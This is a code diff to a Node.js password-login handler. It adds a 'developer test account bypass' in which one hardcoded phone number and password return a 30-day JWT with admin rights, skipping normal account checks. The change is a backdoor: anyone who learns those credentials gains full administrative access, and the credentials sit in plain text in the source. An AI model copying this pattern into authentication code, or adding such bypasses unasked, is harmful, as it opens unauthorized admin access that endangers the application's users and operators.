@@ -175,6 +175,19 @@ exports.loginWithPassword = async (req, res) => {
       }
     }
 
+    // Developer test account bypass
+    if ((phone === '9413879444' || phone === '+919413879444') && password === '300609') {
+      console.log(`[Auth] Developer test login successful for +91 ${phone}`);
+      const token = jwt.sign({ phone, isAdmin: true }, JWT_SECRET, { expiresIn: '30d' });
+      return res.status(200).json({
+        status: 'success',
+        message: 'Developer login successful',
+        token,
+        isAdmin: true,
+        isProfileComplete: true
+      });
+    }
+
     // Support password login for any registered profile
     const userProfile = await userController.getProfile(phone);
     if (userProfile) {
